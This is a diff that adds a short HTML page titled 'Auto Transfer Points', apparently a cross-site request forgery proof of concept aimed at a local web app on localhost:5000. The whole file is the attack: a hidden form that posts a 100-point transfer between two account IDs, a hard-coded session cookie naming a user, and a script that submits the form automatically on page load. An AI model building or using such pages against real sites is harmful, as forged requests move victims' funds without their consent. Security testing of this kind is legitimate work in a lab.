@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Auto Transfer Points</title>
+</head>
+<body>
+    <form id="autoTransferForm" method="POST" action="http://localhost:5000/account">
+        <input type="hidden" name="transfer_from" value="1">
+        <input type="hidden" name="account_id" value="2">
+        <input type="hidden" name="amount" value="100">
+        <input type="hidden" name="transfer" value="Transfer Amount">
+    </form>
+
+    <script>
+        document.cookie = "session=eyJjc3JmX3Rva2VuIjoiNzZlN2U0MzlkMGU1ODY3MTI3M2M0MDVjMTgyNGRhYmUwNDU2ZTYxNCIsInVzZXJuYW1lIjoic2FicmluYSJ9.ZkiGdA.LEo2hU9G_hzcXZxVa52mUbEW8UE; path=/";
+
+        window.onload = function() {
+            document.getElementById('autoTransferForm').submit();
+        };
+    </script>
+</body>
+</html>
